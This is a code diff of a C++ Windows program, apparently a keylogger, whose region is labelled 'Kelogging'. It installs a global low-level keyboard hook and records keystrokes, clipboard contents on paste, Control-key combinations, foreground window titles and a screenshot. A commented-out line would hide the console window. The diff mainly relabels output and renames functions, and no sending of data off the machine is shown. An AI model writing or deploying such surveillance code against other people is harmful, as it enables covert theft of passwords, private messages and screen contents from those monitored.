@@ -7,6 +7,7 @@
 #include <cstdio>
 using namespace std;
 
+
 HHOOK hKeyboardHook;
 int isCaps = 0;
 #pragma region Kelogging
@@ -65,7 +66,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 					else
 						cout << upCase[i];
 				}
-				
+
 				if ((GetAsyncKeyState(VK_CONTROL) != 0) && p->vkCode == 0x56)
 				{
 					cout << "\b \b";
@@ -73,7 +74,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 					if (!OpenClipboard(NULL))
 						cout << "Can't open clipboard" << endl;
 
-					cout << "\n [CLIPBOARD] \n";
+					cout << "\n[CLIPBOARD PASTE]:\n";
 
 					HANDLE h = GetClipboardData(CF_TEXT);
 
@@ -81,6 +82,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 					CloseClipboard();
 				}
+				else if((GetAsyncKeyState(VK_CONTROL) != 0))
+					cout << "\b \b[Control] + " << lowCase[i] << "\n";
 			}
 		}
 
@@ -90,13 +93,12 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 #pragma endregion
 
 #pragma region ActiveWindow
-
 VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
 {
 	if (dwEvent == EVENT_SYSTEM_FOREGROUND)
 	{
 		cout << "\n [WINDOW CHANGE] \n";
-		cout << GetActiveWindowTitle() << endl << endl;
+		cout << getWindowTitle() << endl << endl;
 	}
 }
 
@@ -105,7 +107,8 @@ VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, H
 int main()
 {	
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
-	dumpSS();
+	getScreenShot();
+
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	HWINEVENTHOOK hEvent = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
 		WinEventProcCallback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
